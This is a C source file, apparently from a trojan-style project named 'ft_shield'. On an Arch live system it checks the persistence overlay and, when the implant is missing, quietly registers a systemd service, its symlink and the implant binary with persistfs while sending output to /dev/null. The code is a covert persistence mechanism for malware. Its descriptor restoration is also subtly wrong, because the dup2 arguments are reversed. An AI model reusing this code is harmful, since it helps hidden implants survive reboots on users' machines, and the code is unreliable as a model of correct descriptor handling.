#include "../ft_shield.h"

int	should_add_to_persistfs(void)
{
	struct stat	s;

	return (stat("/run/archiso/persistfs/upperdir"TROLOC, &s) < 0);
}

void	demolinux_specific(void)
{
	int	dn;
	int	oout;
	int	oerr;

	if (should_add_to_persistfs())
	{
		dn = open("/dev/null", O_WRONLY);
		oout = dup(1);
		oerr = dup(2);
		dup2(dn, 1);
		dup2(dn, 2);
		system("/usr/local/bin/persistfs add "SYSTEMD_SERVICE_FILE);
		system("/usr/local/bin/persistfs add "SYSTEMD_SERVICE_SYMLINK);
		system("/usr/local/bin/persistfs add "TROLOC);
		dup2(1, oout);
		dup2(2, oerr);
		close(dn);
	}
}
